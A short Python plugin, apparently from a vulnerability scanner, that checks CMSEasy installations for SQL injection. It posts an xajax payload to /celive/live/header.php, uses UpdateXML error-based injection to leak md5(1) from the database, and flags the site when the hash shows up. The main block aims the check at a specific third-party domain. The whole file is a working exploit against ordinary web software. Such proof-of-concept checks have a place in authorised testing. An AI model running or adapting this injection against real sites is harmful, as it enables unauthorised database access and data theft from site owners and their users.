import re
def assign(service,arg):
    if service == 'cmseasy':
        return True,arg
def audit(arg):
    url = arg + '/celive/live/header.php'
    payload = ("xajax=LiveMessage&xajaxargs[0]=<xjxobj><q><e><k>name</k><v>%27,"
               "(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(md5(1))),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)--%20</v></e></q></xjxobj>")
    code,head,body,errcode,fina_url=curl.curl('-d "%s" %s'%(payload,url))
    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849' in body:
        security_hole(url)
if __name__ == '__main__':
        from dummy import *
        audit(assign('cmseasy','http://www.mldclub.com.cn/')[1])
        
